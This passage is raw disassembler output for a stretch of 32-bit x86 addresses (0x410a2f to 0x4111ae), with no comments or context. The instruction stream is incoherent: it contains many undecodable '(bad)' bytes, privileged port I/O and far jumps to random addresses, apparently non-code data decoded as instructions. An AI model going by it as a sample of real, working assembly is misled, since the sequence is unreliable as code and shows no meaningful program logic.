  410a2f:	xchg   BYTE PTR [eax+eiz*2],al
  410a32:	mov    ch,0x62
  410a34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a35:	or     eax,0xb411a6c0
  410a3a:	xor    DWORD PTR [edx+ecx*1-0x5a],esi
  410a3e:	outs   dx,DWORD PTR ds:[esi]
  410a3f:	pop    esp
  410a40:	pushf  
  410a41:	int    0x60
  410a43:	sbb    DWORD PTR [esi+0x54],esi
  410a46:	xchg   edi,eax
  410a47:	cld    
  410a48:	dec    ecx
  410a49:	cdq    
  410a4a:	jg     0x410ab6
  410a4c:	mov    bh,0x1b
  410a4e:	call   0xed5393df
  410a53:	in     eax,dx
  410a54:	mov    cl,0xe5
  410a56:	mov    ds:0x8343d2c2,eax
  410a5b:	add    eax,0x1e921759
  410a60:	popf   
  410a61:	cmp    al,0x30
  410a63:	sbb    BYTE PTR [esi+0x59c64bb1],dh
  410a69:	aas    
  410a6a:	add    bh,cl
  410a6c:	mov    ecx,0x3acfcc22
  410a71:	or     esp,DWORD PTR [edi-0x212d48da]
  410a77:	ss push ss
  410a79:	mov    esp,0x6828921a
  410a7e:	mov    DWORD PTR [edx-0x784966e0],esi
  410a84:	xor    BYTE PTR [edi+0x3b99deb8],dl
  410a8a:	inc    ebp
  410a8b:	aas    
  410a8c:	and    eax,0x1a329eb7
  410a91:	inc    edi
  410a92:	stos   DWORD PTR es:[edi],eax
  410a93:	jecxz  0x410a33
  410a95:	adc    DWORD PTR [esi],esp
  410a97:	ja     0x410b04
  410a99:	lds    edx,FWORD PTR [esi-0x2]
  410a9c:	and    BYTE PTR [ebp-0x4f9338d3],bl
  410aa2:	push   edx
  410aa3:	clc    
  410aa4:	pop    ebp
  410aa5:	out    dx,al
  410aa6:	sahf   
  410aa7:	sbb    BYTE PTR [eax+0x4f],ah
  410aaa:	push   cs
  410aab:	lods   eax,DWORD PTR ds:[esi]
  410aac:	or     al,0x23
  410aae:	dec    edx
  410aaf:	test   eax,0xa96b0379
  410ab4:	sbb    al,0xab
  410ab6:	add    al,0x2f
  410ab8:	push   ss
  410ab9:	daa    
  410aba:	push   ebx
  410abb:	xor    eax,DWORD PTR [edi]
  410abd:	es sahf 
  410abf:	xchg   ebx,eax
  410ac0:	jne    0x410b2f
  410ac2:	fstp   QWORD PTR [ebx+ebx*4]
  410ac5:	mov    ebx,0x1df762a0
  410aca:	mov    cl,0x6
  410acc:	xor    ebx,esi
  410ace:	and    ebp,esp
  410ad0:	adc    ecx,edx
  410ad2:	mov    ch,0x76
  410ad4:	pop    ecx
  410ad5:	iret   
  410ad6:	adc    dh,BYTE PTR [eax]
  410ad8:	aaa    
  410ad9:	jg     0x410ada
  410adb:	push   cs
  410adc:	add    edx,ecx
  410ade:	mov    esi,0x4f3e8d70
  410ae3:	cli    
  410ae4:	mov    bl,0x3e
  410ae6:	pop    ds
  410ae7:	leave  
  410ae8:	mov    bp,0x9399
  410aec:	into   
  410aed:	fwait
  410aee:	in     al,dx
  410aef:	pop    es
  410af0:	ss mov dh,0x64
  410af3:	addr16 rcl esi,0xc
  410af7:	sub    eax,DWORD PTR [esi+0x16]
  410afa:	and    eax,0xe138d792
  410aff:	rol    BYTE PTR [esi+esi*4-0x558d1c7b],1
  410b06:	scas   al,BYTE PTR es:[edi]
  410b07:	jmp    0xad08f1f0
  410b0c:	aad    0xdc
  410b0e:	jge    0x410b1a
  410b10:	add    DWORD PTR [edi],ebp
  410b12:	ins    DWORD PTR es:[edi],dx
  410b13:	fistp  QWORD PTR [esi+0x36]
  410b16:	jge    0x410ac8
  410b18:	ret    
  410b19:	pop    ds
  410b1a:	jg     0x410b9b
  410b1c:	sti    
  410b1d:	push   eax
  410b1e:	scas   al,BYTE PTR es:[edi]
  410b1f:	call   0x4a5f:0x90bb6353
  410b26:	shl    BYTE PTR [ebp-0x77],cl
  410b29:	pop    eax
  410b2a:	out    dx,al
  410b2b:	push   cs
  410b2c:	mov    ch,0xd5
  410b2e:	(bad)  
  410b2f:	sar    DWORD PTR [ecx],1
  410b31:	neg    esp
  410b33:	and    al,0x5e
  410b35:	sub    al,BYTE PTR [ebp-0x47c6777e]
  410b3b:	xor    BYTE PTR [edx+esi*4+0x69],dh
  410b3f:	cmp    eax,0xfc95dcb
  410b44:	add    DWORD PTR [ecx-0x71],0x546dd82f
  410b4b:	cmp    DWORD PTR [esi],0xfffffff6
  410b4e:	sub    BYTE PTR [ebx+ecx*1],dh
  410b51:	stos   BYTE PTR es:[edi],al
  410b52:	fdiv   st(5),st
  410b54:	push   esp
  410b55:	(bad)  
  410b56:	fcom   DWORD PTR [ebx-0x50]
  410b59:	fs enter 0x8a3e,0xe0
  410b5e:	cmp    eax,0x18cd7d21
  410b63:	jmp    0x410b4e
  410b65:	out    dx,eax
  410b66:	cmp    ch,BYTE PTR [eax]
  410b68:	fcom   QWORD PTR [edi]
  410b6a:	mov    cl,0x25
  410b6c:	adc    dh,dl
  410b6e:	pop    ds
  410b6f:	mov    ch,0xe0
  410b71:	jmp    0x410b07
  410b73:	mov    al,ds:0xc30c110e
  410b78:	dec    eax
  410b79:	or     al,0xd
  410b7b:	scas   al,BYTE PTR es:[edi]
  410b7c:	add    edi,ecx
  410b7e:	div    ebx
  410b80:	dec    eax
  410b81:	xchg   esp,eax
  410b82:	sub    BYTE PTR ds:0x2a22cd2b,0x15
  410b89:	pop    ebx
  410b8a:	les    edx,FWORD PTR [ecx-0x4a]
  410b8d:	nop
  410b8e:	cmp    al,0x31
  410b90:	adc    ebx,DWORD PTR [edi]
  410b92:	inc    BYTE PTR [esi-0x50b8b79e]
  410b98:	or     DWORD PTR [ebp+0x26],esp
  410b9b:	push   eax
  410b9c:	icebp  
  410b9d:	iret   
  410b9e:	adc    al,0x41
  410ba0:	sub    BYTE PTR [ebx-0x50],bh
  410ba3:	in     al,dx
  410ba4:	sbb    ch,bl
  410ba6:	icebp  
  410ba7:	mov    eax,0x43b3da77
  410bac:	dec    ebx
  410bad:	stos   BYTE PTR es:[edi],al
  410bae:	cmp    ebp,DWORD PTR [edx-0xe597ec9]
  410bb4:	adc    dh,bl
  410bb6:	and    BYTE PTR [edi-0x5133a77e],dl
  410bbc:	sbb    ebp,DWORD PTR [edi-0x50759856]
  410bc2:	sbb    DWORD PTR [ecx],edx
  410bc4:	xchg   edx,eax
  410bc5:	scas   eax,DWORD PTR es:[edi]
  410bc6:	pusha  
  410bc7:	out    0x26,eax
  410bc9:	sbb    al,0x63
  410bcb:	or     ah,BYTE PTR [edx+edx*4+0x60]
  410bcf:	mov    edi,0xfe0ceb2d
  410bd4:	sti    
  410bd5:	mov    eax,fs
  410bd7:	mov    edx,0xb2de4106
  410bdc:	cmp    BYTE PTR [edi-0x287d40d6],dl
  410be2:	cs inc eax
  410be4:	inc    edx
  410be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410be6:	mov    esi,DWORD PTR [edi-0x67]
  410be9:	sbb    DWORD PTR ds:0xd475a6b5,ebx
  410bf0:	icebp  
  410bf1:	pop    esi
  410bf2:	mov    gs,edx
  410bf4:	ins    BYTE PTR es:[edi],dx
  410bf5:	shl    bh,1
  410bf7:	pop    ds
  410bf8:	loopne 0x410bc5
  410bfa:	pop    edx
  410bfb:	pop    esi
  410bfc:	push   ss
  410bfd:	fdivr  st(1),st
  410bff:	mov    dh,0x24
  410c01:	test   DWORD PTR [eax],esp
  410c03:	xor    BYTE PTR [edi-0x3d],bl
  410c06:	pop    esi
  410c07:	mov    esp,0x538c8472
  410c0c:	and    eax,0xf9087f7e
  410c11:	inc    esi
  410c12:	bound  edi,QWORD PTR [esi+0x6f4bcaa2]
  410c18:	adc    dh,BYTE PTR [eax-0x3f]
  410c1b:	lds    ecx,FWORD PTR [edi+eax*4-0x6701c55]
  410c22:	xchg   esp,eax
  410c23:	jge    0x410c0f
  410c25:	out    dx,eax
  410c26:	stos   DWORD PTR es:[edi],eax
  410c27:	je     0x410c1d
  410c29:	sub    al,0x52
  410c2b:	or     DWORD PTR [eax-0x36],eax
  410c2e:	ret    
  410c2f:	or     DWORD PTR [ebp+0x5736fa20],ebx
  410c35:	frstpm(287 only) 
  410c37:	push   ebp
  410c38:	test   BYTE PTR [ebp-0x52],0x5a
  410c3c:	or     cl,BYTE PTR [ecx]
  410c3e:	add    al,0x55
  410c40:	out    0x1b,eax
  410c42:	or     eax,0x93cac2f7
  410c47:	inc    ebx
  410c48:	xchg   esp,eax
  410c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c4a:	inc    esi
  410c4b:	add    BYTE PTR [esi-0x420826d0],0x2d
  410c52:	xor    bl,BYTE PTR [ecx+0x3b]
  410c55:	xlat   BYTE PTR ds:[ebx]
  410c56:	sub    edi,DWORD PTR [esi]
  410c58:	loope  0x410c5c
  410c5a:	repnz test al,0xe3
  410c5d:	xchg   edx,eax
  410c5e:	fimul  DWORD PTR [esi-0x31a30427]
  410c64:	sbb    eax,ebx
  410c66:	popa   
  410c67:	sbb    ah,BYTE PTR ds:0xdc1cb
  410c6d:	popa   
  410c6e:	jae    0x410cd1
  410c70:	cmc    
  410c71:	fdiv   DWORD PTR [ebx-0xa1c6ea6]
  410c77:	aas    
  410c78:	imul   edx,DWORD PTR [edi],0x7dcbea15
  410c7e:	cmp    al,0x3a
  410c80:	js     0x410c3e
  410c82:	(bad)  
  410c83:	mov    al,ds:0x5f0fc370
  410c88:	and    eax,0x17a6ab20
  410c8d:	loop   0x410ce5
  410c8f:	ret    0x669a
  410c92:	hlt    
  410c93:	int3   
  410c94:	add    BYTE PTR [esi+0x1c8f106c],al
  410c9a:	pop    eax
  410c9b:	jmp    0x40c8ff65
  410ca0:	and    DWORD PTR [eax],ecx
  410ca2:	(bad)  
  410ca4:	xchg   ebx,eax
  410ca5:	jg     0x410cda
  410ca7:	and    al,0x42
  410ca9:	cmc    
  410caa:	xchg   esi,eax
  410cab:	inc    ebp
  410cac:	adc    BYTE PTR ds:0x5a279d27,bl
  410cb2:	mov    ah,0xb
  410cb4:	jecxz  0x410d2f
  410cb6:	(bad)  
  410cb7:	fs call 0xb9ad9418
  410cbd:	daa    
  410cbe:	rol    DWORD PTR [ebp+0x48634c1a],1
  410cc4:	add    esp,DWORD PTR [ecx]
  410cc6:	dec    eax
  410cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cc8:	fldenv [edi+0x5a92fc6]
  410cce:	mov    al,0x68
  410cd0:	mov    bl,0x60
  410cd2:	rcr    DWORD PTR [eax+0x4],0x62
  410cd6:	fidivr WORD PTR [eiz*8-0x48d58ee1]
  410cdd:	mov    ebp,0xb04dac18
  410ce2:	loop   0x410cb9
  410ce4:	loop   0x410d14
  410ce6:	mov    ds:0xaeb85c93,al
  410ceb:	mov    ebp,0x192580d5
  410cf0:	xchg   ecx,eax
  410cf1:	cs jne 0x410d31
  410cf4:	shl    DWORD PTR [edi+ecx*8-0x8],1
  410cf8:	mov    ds:0xc9e53ebd,eax
  410cfd:	in     al,dx
  410cfe:	sbb    al,0x6b
  410d00:	test   eax,0x29f61af0
  410d05:	cmp    BYTE PTR [esi],ah
  410d07:	loopne 0x410d09
  410d09:	out    0x24,eax
  410d0b:	sub    ebx,DWORD PTR [ecx+ebx*8+0x45]
  410d0f:	lds    ebx,FWORD PTR [ebx-0x70]
  410d12:	and    BYTE PTR [edi-0xfc61191],ch
  410d18:	mov    esp,DWORD PTR [edi-0x6647b6e]
  410d1e:	push   ds
  410d1f:	fisttp DWORD PTR [ecx-0x22]
  410d22:	mov    edx,0xbc1bdc54
  410d27:	mov    ds:0x65b28933,al
  410d2c:	sbb    al,0x4
  410d2e:	xchg   ebp,eax
  410d2f:	aam    0xa
  410d31:	pop    edi
  410d32:	sbb    ch,BYTE PTR [eax+0x509610cf]
  410d38:	jle    0x410d1b
  410d3a:	clc    
  410d3b:	shl    BYTE PTR ds:0xf8fd78d3,cl
  410d41:	push   ebx
  410d42:	jmp    0x7bbd3160
  410d47:	sub    eax,0x9703149d
  410d4c:	aaa    
  410d4d:	(bad)  
  410d4e:	shr    BYTE PTR [esi],cl
  410d50:	jbe    0x410d5b
  410d52:	int    0x4c
  410d54:	loop   0x410d57
  410d56:	lock push ebx
  410d58:	adc    esi,edx
  410d5a:	out    0x6,al
  410d5c:	fld    TBYTE PTR [ebx-0x43]
  410d5f:	mov    bl,0xa1
  410d61:	sub    eax,DWORD PTR [eax+0x69]
  410d64:	sbb    dh,al
  410d66:	dec    eax
  410d67:	punpcklbw mm0,DWORD PTR [ebx]
  410d6a:	pop    edx
  410d6b:	cmp    al,0x2a
  410d6d:	(bad)  [edx-0x4d]
  410d70:	jmp    0x410cfa
  410d72:	sbb    BYTE PTR [ecx-0x601e65],al
  410d78:	push   ecx
  410d79:	hlt    
  410d7a:	aas    
  410d7b:	mov    ds:0x9358e3ee,al
  410d80:	cdq    
  410d81:	adc    dl,dl
  410d83:	pusha  
  410d84:	fistp  QWORD PTR [edi+0x30d93cc3]
  410d8a:	sar    BYTE PTR [edx],0x9
  410d8d:	xor    al,0x9c
  410d8f:	inc    ebp
  410d90:	in     eax,dx
  410d91:	lahf   
  410d92:	pop    edx
  410d93:	pop    ds
  410d94:	aam    0x7d
  410d96:	push   eax
  410d97:	jbe    0x410d1b
  410d99:	mov    ds:0xa0549b8f,al
  410d9e:	(bad)  
  410d9f:	fbstp  TBYTE PTR [edi+0x2e61cec9]
  410da5:	sub    bl,BYTE PTR [edx]
  410da7:	inc    eax
  410da8:	push   DWORD PTR [edx-0x3]
  410dab:	sub    BYTE PTR [edi+0x53dda572],cl
  410db1:	and    edx,ebx
  410db3:	test   eax,0x1f4d778
  410db8:	popa   
  410db9:	ins    BYTE PTR es:[edi],dx
  410dba:	ret    0x5937
  410dbd:	call   0x635c733a
  410dc2:	or     al,0xcd
  410dc4:	pop    ss
  410dc5:	cld    
  410dc6:	cmc    
  410dc7:	test   DWORD PTR [ecx+0x3a153a1e],0xd3e674f2
  410dd1:	push   eax
  410dd2:	jmp    0xa482:0x7c723bed
  410dd9:	loope  0x410d6d
  410ddb:	stos   DWORD PTR es:[edi],eax
  410ddc:	or     BYTE PTR [esi+0x59],dl
  410ddf:	mov    ebx,DWORD PTR [ebx]
  410de1:	pop    esp
  410de2:	stos   DWORD PTR es:[edi],eax
  410de3:	(bad)
  410de6:	out    0x15,al
  410de8:	inc    edi
  410de9:	dec    esi
  410dea:	sub    dl,BYTE PTR [ecx+0x41b7ad40]
  410df0:	push   esi
  410df1:	shr    BYTE PTR [esi+0x36741360],cl
  410df7:	retf   
  410df8:	in     al,dx
  410df9:	(bad)  
  410dfb:	sbb    BYTE PTR [edx-0x752267ea],bh
  410e01:	clc    
  410e02:	pop    edx
  410e03:	out    dx,al
  410e04:	fs push eax
  410e06:	xchg   BYTE PTR [edx+0x12],al
  410e09:	mov    dh,0xc5
  410e0b:	xchg   esp,eax
  410e0c:	add    ah,BYTE PTR [ecx+0x3a9b6aa2]
  410e12:	xchg   ecx,eax
  410e13:	push   esp
  410e14:	and    al,0x60
  410e16:	outs   dx,DWORD PTR ds:[esi]
  410e17:	out    0xd3,eax
  410e19:	sbb    al,0xc8
  410e1b:	and    edx,DWORD PTR ds:0xa1094153
  410e21:	hlt    
  410e22:	(bad)  
  410e23:	loope  0x410e6a
  410e25:	scas   eax,DWORD PTR es:[edi]
  410e26:	outs   dx,BYTE PTR ds:[esi]
  410e27:	adc    bl,BYTE PTR ds:0xf4c1b0d5
  410e2d:	sub    al,0xd8
  410e2f:	pop    ecx
  410e30:	pop    esi
  410e31:	dec    esp
  410e32:	add    BYTE PTR [eax+0x96c127d],cl
  410e38:	jmp    0x410de6
  410e3a:	shl    BYTE PTR [edi+0x7b],0x84
  410e3e:	in     al,0xb6
  410e40:	and    eax,0xe6053976
  410e45:	nop
  410e46:	js     0x410e6c
  410e48:	or     ah,BYTE PTR [edx+0x51]
  410e4b:	cmovne esi,DWORD PTR [edi-0x2264237d]
  410e52:	jmp    0x410e48
  410e54:	pusha  
  410e55:	leave  
  410e56:	cdq    
  410e57:	jl     0x410eaf
  410e59:	test   DWORD PTR [esi-0x31],ebx
  410e5c:	pop    ebx
  410e5d:	add    al,0x15
  410e5f:	dec    ecx
  410e60:	sub    dl,dl
  410e62:	rcr    DWORD PTR [esi+0x1f0592af],cl
  410e68:	sbb    eax,ebp
  410e6a:	adc    dh,BYTE PTR ds:0x9e5bb3c6
  410e70:	aam    0xb0
  410e72:	fnstsw WORD PTR [esi+ebx*8+0x40]
  410e76:	(bad)  
  410e77:	fild   QWORD PTR [ebx]
  410e79:	fnstenv [edx]
  410e7b:	leave  
  410e7c:	or     bh,BYTE PTR [ebp-0x5a5e7c33]
  410e82:	jmp    0x18f7b79c
  410e87:	mov    al,ds:0x3cf3ed29
  410e8c:	xchg   ebx,eax
  410e8d:	xor    DWORD PTR [ebx+ebp*4+0xd],ebx
  410e91:	and    BYTE PTR [esi-0x6f],ch
  410e94:	xchg   DWORD PTR [eax-0x1a],edi
  410e97:	test   DWORD PTR [eax],esp
  410e99:	je     0x410efc
  410e9b:	jl     0x410e4c
  410e9d:	adc    BYTE PTR [ebx-0xdb631e9],dl
  410ea3:	lea    ebx,[esi-0x42]
  410ea6:	or     DWORD PTR [edx],edi
  410ea8:	and    DWORD PTR [edi+eiz*1-0x4f84814f],ebx
  410eaf:	test   al,0xc5
  410eb1:	sub    ebx,esi
  410eb3:	cmp    ebx,DWORD PTR [esi]
  410eb5:	imul   esp,DWORD PTR [edx-0x16],0x6e
  410eb9:	sar    DWORD PTR [edi-0x32],0x2f
  410ebd:	xchg   edi,eax
  410ebe:	idiv   DWORD PTR [ebp-0x21]
  410ec1:	inc    esp
  410ec2:	jp     0x410ec7
  410ec4:	arpl   WORD PTR [edi-0x17deedab],sp
  410eca:	in     al,0x97
  410ecc:	outs   dx,BYTE PTR ds:[esi]
  410ecd:	mov    al,0x3d
  410ecf:	fwait
  410ed0:	sar    DWORD PTR [edi],1
  410ed2:	pop    ecx
  410ed3:	xor    cl,BYTE PTR [esi*2+0xb23c370]
  410eda:	out    dx,al
  410edb:	cmp    al,0xcf
  410edd:	ss push 0xdeedf36
  410ee3:	pop    ebx
  410ee4:	jg     0x410f52
  410ee6:	mov    ebp,0x274d6fb1
  410eeb:	inc    esi
  410eec:	pop    es
  410eed:	mov    bl,0x24
  410eef:	sub    BYTE PTR [ecx+0xb],dl
  410ef2:	shl    BYTE PTR [edi-0x6300c562],0xc9
  410ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410efa:	sbb    bl,bh
  410efc:	(bad)  [ebx+0x1d]
  410eff:	popa   
  410f00:	(bad)  
  410f01:	loopne 0x410f51
  410f03:	sbb    BYTE PTR [edi+0xf537182],bh
  410f09:	icebp  
  410f0a:	and    eax,DWORD PTR [ebx+0x3e07f74]
  410f10:	xor    BYTE PTR [ebx-0x735e2b8d],cl
  410f16:	repz lds esi,FWORD PTR [eax]
  410f19:	sbb    al,0x78
  410f1b:	mov    ebp,0xaccae9fd
  410f20:	cmp    cl,BYTE PTR [ebx-0x3e]
  410f23:	fimul  DWORD PTR [ecx+0x3f316688]
  410f29:	xlat   BYTE PTR ds:[ebx]
  410f2a:	scas   al,BYTE PTR es:[edi]
  410f2b:	add    DWORD PTR [ebp+0x52],eax
  410f2e:	jae    0x410efd
  410f30:	fdivr  DWORD PTR [ebx+0xa]
  410f33:	push   es
  410f34:	out    0xef,al
  410f36:	lods   al,BYTE PTR ds:[esi]
  410f37:	xor    ebp,ebp
  410f39:	call   0x8876e1c0
  410f3e:	inc    esp
  410f3f:	repnz mov al,al
  410f42:	mov    ebp,0xf12aac79
  410f47:	add    eax,0xbed6a451
  410f4c:	inc    ax
  410f4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f4f:	pop    edi
  410f50:	(bad)  
  410f51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f52:	xor    eax,edi
  410f54:	out    dx,al
  410f55:	add    al,0xc2
  410f57:	add    BYTE PTR [edx],ah
  410f59:	cld    
  410f5a:	outs   dx,BYTE PTR ds:[esi]
  410f5b:	and    BYTE PTR [eax-0x7bab4bd4],bl
  410f61:	sbb    BYTE PTR [ebx-0x78],bh
  410f64:	mov    ds:0x1e0c847f,eax
  410f69:	inc    esi
  410f6a:	lahf   
  410f6b:	(bad)
  410f6e:	outs   dx,BYTE PTR ds:[esi]
  410f6f:	add    BYTE PTR [esi],ch
  410f71:	scas   eax,DWORD PTR es:[edi]
  410f72:	sbb    BYTE PTR [ebx+0xdc27c33],0x7a
  410f79:	lods   eax,DWORD PTR cs:[esi]
  410f7b:	mov    cl,0xa3
  410f7d:	mov    ds:0x2d5f745f,al
  410f82:	fdiv   DWORD PTR [eax+eax*1]
  410f85:	sub    BYTE PTR [eax+0x7b21699c],dl
  410f8b:	pushf  
  410f8c:	mov    ebp,0x9c120909
  410f91:	add    bh,0x36
  410f94:	push   esi
  410f95:	mov    ?,esp
  410f97:	add    BYTE PTR [ecx],dh
  410f99:	je     0x410ff2
  410f9b:	in     al,dx
  410f9c:	test   al,0x8e
  410f9e:	lds    eax,FWORD PTR ds:0x9ae989bd
  410fa4:	sbb    cl,dl
  410fa6:	loop   0x41101a
  410fa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fa9:	mov    bh,0x94
  410fab:	mov    ebx,ds
  410fad:	cmp    BYTE PTR [eax+0x64],dh
  410fb0:	dec    esi
  410fb1:	in     eax,dx
  410fb2:	dec    esp
  410fb3:	jl     0x411011
  410fb5:	mov    bh,0x82
  410fb7:	jmp    0x192c797c
  410fbc:	xchg   esp,eax
  410fbd:	inc    eax
  410fbe:	xchg   BYTE PTR [ecx-0x1b55fa3c],ah
  410fc4:	mov    ebx,0x78ec0044
  410fc9:	mov    dh,0xbf
  410fcb:	inc    edx
  410fcc:	push   ds
  410fcd:	pop    ebx
  410fce:	dec    esi
  410fcf:	mov    bl,0x13
  410fd1:	pop    ss
  410fd2:	fisttp WORD PTR [ecx+0x15]
  410fd5:	cwde   
  410fd6:	lds    esp,FWORD PTR [ebp+0x4e6c4024]
  410fdc:	cmp    ah,BYTE PTR [ecx]
  410fde:	cmp    al,0x76
  410fe0:	or     dh,BYTE PTR [eax+0x47]
  410fe3:	or     dl,al
  410fe5:	xor    ebx,DWORD PTR [ebp-0x663172c0]
  410feb:	fcom   QWORD PTR [esi]
  410fed:	push   ebx
  410fee:	test   eax,0x165b8d07
  410ff3:	outs   dx,DWORD PTR gs:[esi]
  410ff5:	jbe    0x410fc8
  410ff7:	cmp    DWORD PTR ds:0x22640f12,ebp
  410ffd:	mov    ah,0x62
  410fff:	push   ss
  411000:	cld    
  411001:	sub    DWORD PTR [eax],eax
  411003:	in     al,dx
  411004:	dec    ebx
  411005:	cmp    BYTE PTR [ebx],dh
  411007:	rol    BYTE PTR [ecx-0x48b85f29],0x5
  41100e:	(bad)  
  41100f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411010:	ds loopne 0x41100b
  411013:	daa    
  411014:	mov    dh,0x1b
  411016:	sahf   
  411017:	sub    ch,BYTE PTR [edx-0x41]
  41101a:	dec    ebx
  41101b:	jo     0x410fbe
  41101d:	sbb    BYTE PTR [edx],cl
  41101f:	jecxz  0x411010
  411021:	push   ss
  411022:	jbe    0x41101f
  411024:	ins    DWORD PTR es:[edi],dx
  411025:	adc    ah,BYTE PTR [edx]
  411027:	jge    0x41103a
  411029:	cwde   
  41102a:	das    
  41102b:	in     eax,0x30
  41102d:	pop    ebp
  41102e:	cmc    
  41102f:	sar    DWORD PTR [edx],0xa0
  411032:	and    esp,eax
  411034:	icebp  
  411035:	daa    
  411036:	xchg   edx,eax
  411037:	mov    BYTE PTR [edi],bh
  411039:	and    BYTE PTR [ecx-0x4ef87869],dh
  41103f:	lods   al,BYTE PTR ds:[esi]
  411040:	sti    
  411041:	ins    DWORD PTR es:[edi],dx
  411042:	inc    esp
  411043:	and    dl,BYTE PTR [edx]
  411045:	jle    0x41101d
  411047:	neg    DWORD PTR [esp+esi*8-0x225e9eaa]
  41104e:	retf   
  41104f:	xchg   edx,eax
  411050:	test   DWORD PTR [edx+0x6628e555],esp
  411056:	and    ch,dh
  411058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411059:	cld    
  41105a:	enter  0x55aa,0xc8
  41105e:	nop
  41105f:	inc    edi
  411060:	pop    ecx
  411061:	sbb    al,0x97
  411063:	mov    ah,0x2f
  411065:	fld    QWORD PTR [edi-0x1d]
  411068:	jmp    0x7824:0x3617737e
  41106f:	inc    esi
  411070:	aad    0x65
  411072:	mov    ds:0xed493a2,al
  411077:	mov    bh,0x12
  411079:	mov    dh,0x9e
  41107b:	jb     0x4110bc
  41107d:	sar    ecx,1
  41107f:	out    0x7d,al
  411081:	push   esp
  411082:	push   ebx
  411083:	dec    esi
  411084:	xor    DWORD PTR [edi],edi
  411086:	imul   eax,DWORD PTR [esi],0xfffffff4
  411089:	adc    eax,0x822b8f81
  41108e:	add    dh,BYTE PTR [edi]
  411090:	jae    0x4110ea
  411092:	pusha  
  411093:	mov    cl,0x74
  411095:	push   ecx
  411096:	xchg   edi,eax
  411097:	mov    ecx,0x23bfdcc3
  41109c:	jb     0x411100
  41109e:	adc    al,0x67
  4110a0:	xor    ecx,edi
  4110a2:	jae    0x41109a
  4110a4:	push   eax
  4110a5:	scas   eax,DWORD PTR es:[edi]
  4110a6:	icebp  
  4110a7:	adc    BYTE PTR [ebx-0x2],al
  4110aa:	mov    esi,0xb096a2e4
  4110af:	cmp    al,0xbb
  4110b1:	iret   
  4110b2:	mov    BYTE PTR [ebp-0x2e],ah
  4110b5:	hlt    
  4110b6:	imul   eax,esp,0x8a6ad11b
  4110bc:	mov    eax,0x65977aec
  4110c1:	in     eax,0x89
  4110c3:	or     dl,BYTE PTR [esi]
  4110c5:	jno    0x41107a
  4110c7:	or     BYTE PTR [eax],bl
  4110c9:	lahf   
  4110ca:	jbe    0x411103
  4110cc:	sbb    BYTE PTR [esi-0x57],dh
  4110cf:	in     al,dx
  4110d0:	pop    eax
  4110d1:	jae    0x4110bd
  4110d3:	dec    esp
  4110d4:	jo     0x4110e8
  4110d6:	lods   al,BYTE PTR ds:[esi]
  4110d7:	jle    0x4110b3
  4110d9:	iret   
  4110da:	add    al,0x74
  4110dc:	pop    ss
  4110dd:	or     BYTE PTR [ebp-0x4a],dh
  4110e0:	cmp    bh,BYTE PTR [ebx+0x442a17]
  4110e6:	hlt    
  4110e7:	mov    edx,0x64615bf3
  4110ec:	fdivr  DWORD PTR [esp+esi*8-0x1e0443db]
  4110f3:	lea    eax,[edx]
  4110f5:	push   eax
  4110f6:	cwde   
  4110f7:	mov    edi,0xd9051743
  4110fc:	adc    ah,ah
  4110fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110ff:	sahf   
  411100:	pusha  
  411101:	inc    eax
  411102:	cs xchg ecx,eax
  411104:	les    esi,FWORD PTR [ebx+0x7eaa8806]
  41110a:	mov    eax,ds:0x32974c2
  41110f:	inc    eax
  411110:	test   al,0x1e
  411112:	xchg   edi,eax
  411113:	cli    
  411114:	jns    0x411186
  411116:	scas   eax,DWORD PTR es:[edi]
  411117:	cmc    
  411118:	jmp    0x4110f0
  41111a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41111b:	lds    eax,FWORD PTR [edi]
  41111d:	push   ds
  41111e:	(bad)  
  41111f:	jecxz  0x411162
  411121:	stos   DWORD PTR es:[edi],eax
  411122:	inc    ecx
  411123:	fldcw  WORD PTR [esi]
  411125:	xor    DWORD PTR [ebx+eiz*4-0x4c6f16a6],esp
  41112c:	dec    esp
  41112d:	or     eax,0x83e81b7
  411132:	push   ds
  411133:	inc    esi
  411134:	fiadd  DWORD PTR [esi-0x2fd93989]
  41113a:	cmp    eax,esp
  41113c:	test   bh,al
  41113e:	cmp    al,0xf6
  411140:	pusha  
  411141:	fcom   QWORD PTR [ebp+0x42a10f52]
  411147:	lahf   
  411148:	jl     0x41119f
  41114a:	test   BYTE PTR [esi],0xd4
  41114d:	(bad)  
  41114f:	sub    al,0xe
  411151:	push   ebx
  411152:	out    dx,al
  411153:	fist   DWORD PTR [edi-0x6736e3d8]
  411159:	xchg   edi,eax
  41115a:	mov    fs,WORD PTR [edx+0x73778472]
  411160:	pusha  
  411161:	adc    BYTE PTR [edx-0x2d],0x93
  411165:	xchg   esp,eax
  411166:	cld    
  411167:	fwait
  411168:	and    ecx,DWORD PTR [edx+eax*1]
  41116b:	mov    al,0xb2
  41116d:	inc    ebx
  41116e:	mov    es,WORD PTR [ebx-0x50]
  411171:	call   0x5b8b3b92
  411176:	clc    
  411177:	inc    edx
  411178:	ins    BYTE PTR es:[edi],dx
  411179:	outs   dx,DWORD PTR ds:[esi]
  41117a:	inc    ebx
  41117b:	cdq    
  41117c:	outs   dx,BYTE PTR ds:[esi]
  41117d:	ret    0x5485
  411180:	out    0x27,eax
  411182:	add    BYTE PTR [edx],dh
  411184:	(bad)  
  411185:	in     al,0xb
  411187:	jb     0x411196
  411189:	add    DWORD PTR [ebx-0x3534d780],edx
  41118f:	lods   al,BYTE PTR ds:[esi]
  411190:	scas   al,BYTE PTR es:[edi]
  411191:	out    dx,eax
  411192:	push   ss
  411193:	mov    edi,DWORD PTR [ecx+0x11]
  411196:	test   DWORD PTR [ebp+0x55],0x4cd3aec7
  41119d:	mov    eax,0x7494a913
  4111a2:	mov    ds:0x716c650f,al
  4111a7:	xor    eax,edx
  4111a9:	mov    eax,0x1efd72a3
  4111ae:	mov    esp,0xa2d646cf
